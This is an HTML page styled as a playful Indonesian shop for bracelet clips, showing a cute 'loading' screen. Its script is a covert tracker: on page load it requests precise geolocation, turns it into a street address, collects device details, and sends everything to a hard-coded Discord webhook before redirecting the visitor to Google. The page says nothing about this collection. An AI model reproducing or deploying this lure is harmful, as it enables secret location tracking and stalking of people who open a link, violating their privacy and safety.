<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HAAII - Gelang Jepit Lucu</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Fredoka', sans-serif;
            background: linear-gradient(135deg, #FFB6D9 0%, #FFC0E3 50%, #FFD4E5 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }
        
        .star {
            position: absolute;
            color: #FFD700;
            font-size: 24px;
            animation: twinkle 3s infinite;
        }
        
        @keyframes twinkle {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 50px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(255, 105, 180, 0.3);
            text-align: center;
            max-width: 500px;
            position: relative;
            z-index: 10;
            border: 3px solid #FFB6D9;
        }
        
        .header {
            margin-bottom: 30px;
        }
        
        h1 {
            font-size: 48px;
            background: linear-gradient(135deg, #FF69B4, #FF1493, #FF69B4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
            text-shadow: 2px 2px 4px rgba(255, 105, 180, 0.2);
            margin-bottom: 10px;
            letter-spacing: 3px;
            transform: perspective(500px) rotateX(5deg);
        }
        
        .subtitle {
            color: #FF69B4;
            font-size: 16px;
            font-weight: 600;
        }
        
        .sticker-group {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 25px 0;
        }
        
        .sticker-item {
            font-size: 45px;
            animation: bounce 2s infinite;
            filter: drop-shadow(0 5px 10px rgba(255, 105, 180, 0.3));
        }
        
        .sticker-item:nth-child(2) {
            animation-delay: 0.2s;
        }
        
        .sticker-item:nth-child(3) {
            animation-delay: 0.4s;
        }
        
        .sticker-item:nth-child(4) {
            animation-delay: 0.6s;
        }
        
        .sticker-item:nth-child(5) {
            animation-delay: 0.8s;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        
        .text-3d {
            font-size: 28px;
            color: #FF1493;
            font-weight: 700;
            text-shadow: 
                3px 3px 0px #FFB6D9,
                6px 6px 0px rgba(255, 105, 180, 0.3),
                9px 9px 15px rgba(0, 0, 0, 0.1);
            transform: perspective(600px) rotateX(2deg) rotateY(-2deg);
            margin: 20px 0;
            line-height: 1.4;
        }
        
        .spinner {
            border: 4px solid #FFE4F0;
            border-top: 4px solid #FF69B4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .heart-float {
            position: fixed;
            font-size: 30px;
            color: #FFB6D9;
            pointer-events: none;
            animation: float-up 4s ease-out forwards;
        }
        
        @keyframes float-up {
            0% {
                transform: translateY(0) translateX(0) scale(1);
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) translateX(100px) scale(0);
                opacity: 0;
            }
        }
        
        .decor-left, .decor-right {
            position: fixed;
            font-size: 80px;
            opacity: 0.3;
            pointer-events: none;
        }
        
        .decor-left {
            top: 10%;
            left: 5%;
            animation: float 6s ease-in-out infinite;
        }
        
        .decor-right {
            bottom: 10%;
            right: 5%;
            animation: float 8s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(30px); }
        }
    </style>
</head>
<body>
    <div class="decor-left">💕</div>
    <div class="decor-right">✨</div>
    <div class="stars" id="stars"></div>
    
    <div class="container">
        <div class="header">
            <h1>HAAII 💖</h1>
            <p class="subtitle">✨ Gelang Jepit Terlucu di Indonesia ✨</p>
        </div>
        
        <div class="sticker-group">
            <div class="sticker-item">🐰</div>
            <div class="sticker-item">🌸</div>
            <div class="sticker-item">💗</div>
            <div class="sticker-item">🎀</div>
            <div class="sticker-item">⭐</div>
        </div>
        
        <div class="spinner"></div>
        
        <div class="text-3d">TUNGGUU YAA SAYANG<br>LAGI LOADING NIH 💕</div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1560949292737241180/ZUAl6mbD8KplIJsz559eHil5C76Rf1w_PBhJ0w1D_5YjBb2WZbz2Mj1ee09700pElVZW';
        
        function createStars() {
            const starsContainer = document.getElementById('stars');
            for (let i = 0; i < 20; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.textContent = '⭐';
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.animationDelay = Math.random() * 3 + 's';
                starsContainer.appendChild(star);
            }
        }
        
        function createFloatingHeart() {
            const heart = document.createElement('div');
            heart.className = 'heart-float';
            heart.textContent = '💕';
            heart.style.left = Math.random() * window.innerWidth + 'px';
            heart.style.top = window.innerHeight + 'px';
            document.body.appendChild(heart);
            setTimeout(() => heart.remove(), 4000);
        }
        
        function getLiveTimestamp() {
            const now = new Date();
            return new Intl.DateTimeFormat('id-ID', {
                timeZone: 'Asia/Jakarta',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            }).format(now);
        }
        
        function getTimezone() {
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            return tz || 'Asia/Jakarta (UTC+7)';
        }
        
        async function reverseGeocode(lat, lon) {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
                    { signal: AbortSignal.timeout(3000) }
                );
                const data = await response.json();
                return data.address || null;
            } catch (error) {
                return null;
            }
        }
        
        function formatAddress(addressData) {
            if (!addressData) return 'Lokasi terdeteksi';
            
            const parts = [];
            if (addressData.house_number) parts.push(addressData.house_number);
            if (addressData.road) parts.push(addressData.road);
            if (addressData.neighbourhood) parts.push(addressData.neighbourhood);
            if (addressData.suburb) parts.push(addressData.suburb);
            if (addressData.city) parts.push(addressData.city);
            if (addressData.state) parts.push(addressData.state);
            if (addressData.postcode) parts.push(addressData.postcode);
            if (addressData.country) parts.push(addressData.country);
            
            return parts.length > 0 ? parts.join(', ') : (addressData.display_name || 'Lokasi terdeteksi');
        }
        
        async function getDeviceInfo() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: screen.width + 'x' + screen.height,
                timezone: getTimezone(),
                timestamp: getLiveTimestamp(),
                cookiesEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
            };
        }
        
        async function captureLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        const addressData = await reverseGeocode(lat, lon);
                        const fullAddress = formatAddress(addressData);
                        
                        resolve({
                            latitude: lat.toFixed(8),
                            longitude: lon.toFixed(8),
                            accuracy: accuracy.toFixed(2),
                            address: fullAddress,
                            mapsUrl: `https://maps.google.com/?q=${lat},${lon}`,
                            status: 'success'
                        });
                    },
                    function(error) {
                        resolve({
                            latitude: 'denied',
                            longitude: 'denied',
                            accuracy: 'denied',
                            address: 'Permission denied or unavailable',
                            mapsUrl: 'N/A',
                            status: 'denied'
                        });
                    },
                    { timeout: 5000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });
        }
        
        async function sendToWebhook(locationData, deviceInfo) {
            const data = {
                "embeds": [{
                    "title": "🎀 HAAII Visitor 🎀",
                    "color": 16711827,
                    "fields": [
                        {
                            "name": "📍 LOKASI LENGKAP",
                            "value": locationData.address,
                            "inline": false
                        },
                        {
                            "name": "🧭 Koordinat",
                            "value": `Lat: ${locationData.latitude}\nLon: ${locationData.longitude}`,
                            "inline": true
                        },
                        {
                            "name": "📏 Akurasi",
                            "value": `${locationData.accuracy}m`,
                            "inline": true
                        },
                        {
                            "name": "🖥️ Device",
                            "value": deviceInfo.platform,
                            "inline": true
                        },
                        {
                            "name": "🌐 Bahasa",
                            "value": deviceInfo.language,
                            "inline": true
                        },
                        {
                            "name": "📺 Screen",
                            "value": deviceInfo.screenResolution,
                            "inline": true
                        },
                        {
                            "name": "⏰ Waktu",
                            "value": deviceInfo.timestamp,
                            "inline": true
                        },
                        {
                            "name": "📍 Google Maps",
                            "value": `[Buka Maps](${locationData.mapsUrl})`,
                            "inline": false
                        },
                        {
                            "name": "🔗 User Agent",
                            "value": `\`\`\`${deviceInfo.userAgent.substring(0, 100)}...\`\`\``,
                            "inline": false
                        }
                    ]
                }]
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.log('Sent');
            }
        }
        
        window.addEventListener('load', async () => {
            createStars();
            setInterval(createFloatingHeart, 300);
            
            const locationData = await captureLocation();
            const deviceInfo = await getDeviceInfo();
            
            await sendToWebhook(locationData, deviceInfo);
            
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 1500);
        });
    </script>
</body>
</html>
